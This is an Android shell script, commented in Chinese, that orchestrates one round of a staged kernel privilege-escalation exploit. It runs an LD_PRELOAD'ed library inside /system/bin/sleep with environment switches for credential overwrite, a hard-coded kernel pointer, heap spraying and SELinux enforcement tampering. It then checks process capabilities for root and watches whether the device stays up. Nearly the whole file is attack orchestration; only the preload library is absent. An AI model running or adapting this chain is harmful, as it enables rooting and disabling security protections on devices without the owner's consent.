#!/system/bin/sh
# mt78 chain (2026-09-06): R(CPU6) -> E5v3(SPRAY) -> observe 2min
# 依据: HANDOFF_2026-09-05_takeover §6.4 + mt77 已验证配方 + mt78 BUILD_INFO
# 红线: 本脚本到 E5v3+观察为止; C+KO/E5R 需分析侧判定后再放行。
NAME=mt78chain
LOG=/data/local/tmp/${NAME}_log.txt
OUTD=/data/local/tmp
LOAD=$(cut -d' ' -f1 /proc/loadavg 2>/dev/null || echo 0)
LOAD_INT=${LOAD%.*}
if [ "${LOAD_INT:-99}" -gt 15 ]; then
  echo "load gate: 1-min loadavg=$LOAD >15, refuse" ; exit 2
fi
echo "=== mt78 chain start $(date +%H:%M:%S) boot=$(cat /proc/sys/kernel/random/boot_id) preload=$(sha256sum $OUTD/preload.so | cut -d' ' -f1)" > $LOG

# 0) 清残留 + 零成本取证 (avc 走 logcat, dmesg 对 shell 关闭)
pkill -9 -x sleep 2>/dev/null
pkill -9 -f 'while :; do' 2>/dev/null
am kill-all 2>/dev/null
rm -f $OUTD/mt49_child_status.txt $OUTD/root_alive.txt $OUTD/R.out $OUTD/E5v3.out
echo "--- historical avc kernel-domain denials (logcat) ---" >> $LOG
logcat -d -b main 2>/dev/null | grep -i "avc" | grep -w "kernel" | tail -20 >> $LOG
echo "avc_kernel_count=$(logcat -d -b main 2>/dev/null | grep -i avc | grep -cw kernel)" >> $LOG

# 1) R 轮 (mt77 已验证配方 + CPU6)
echo "--- round 1: R fork (CPU6) ---" >> $LOG
timeout 250 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R \
  PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 \
  PSELECT_CONSUMER_CPU=6 \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
  PSELECT_NO_CANARY=1 \
  LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 180 \
  > $OUTD/R.out 2>&1
echo "R rc=$? enforce=$(getenforce)" >> $LOG
ST=$(cat $OUTD/mt49_child_status.txt 2>/dev/null)
echo "R gate status: $ST" >> $LOG
grep -a "mt48: PTR\|mt33: child\|mt77:\|pselect returned" $OUTD/R.out 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | head -12 >> $LOG
TASK=$(printf '%s' "$ST" | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1)
if printf '%s' "$ST" | grep -aq "CapEff=0000000000000000"; then
  echo "R MISS — E5v3 仍可跑(E5 与 R-child 无依赖), 但 C 轮窗口无 child" >> $LOG
  TASK=""
fi
[ -z "$TASK" ] && echo "no task= (external 模式缺参, E5v3 改 fork 模式)" >> $LOG

# 2) E5v3 轮 (SPRAY 默认, mt78; external 若有 TASK)
echo "--- round 2: E5v3 SPRAY ---" >> $LOG
sleep 5
if [ -n "$TASK" ]; then
  timeout 250 env \
    PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
    PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 \
    PSELECT_TASK=$TASK PSELECT_PTR_STRICT=1 \
    PSELECT_CONSUMER_CPU=6 \
    PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
    PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
    PSELECT_NO_CANARY=1 \
    LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 180 \
    > $OUTD/E5v3.out 2>&1
else
  timeout 250 env \
    PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
    PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 \
    PSELECT_CONSUMER_CPU=6 \
    PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
    PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
    PSELECT_NO_CANARY=1 \
    LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 180 \
    > $OUTD/E5v3.out 2>&1
fi
echo "E5v3 rc=$? enforce=$(getenforce) boot=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
grep -a "mt78:\|mt77:\|pselect returned" $OUTD/E5v3.out 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | head -12 >> $LOG

# 3) 判定观察 120s: enforce 稳定性 + 系统存活
echo "--- observe 120s ---" >> $LOG
N=0
while [ $N -lt 12 ]; do
  sleep 10
  N=$((N+1))
  echo "t=$((N*10))s enforce=$(getenforce 2>&1) load=$(cut -d' ' -f1 /proc/loadavg) boot=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
done
echo "--- final: mt49_child_status / root_alive ---" >> $LOG
cat $OUTD/mt49_child_status.txt 2>/dev/null >> $LOG
cat $OUTD/root_alive.txt 2>/dev/null >> $LOG
echo "=== chain end $(date +%H:%M:%S)" >> $LOG
cat $LOG
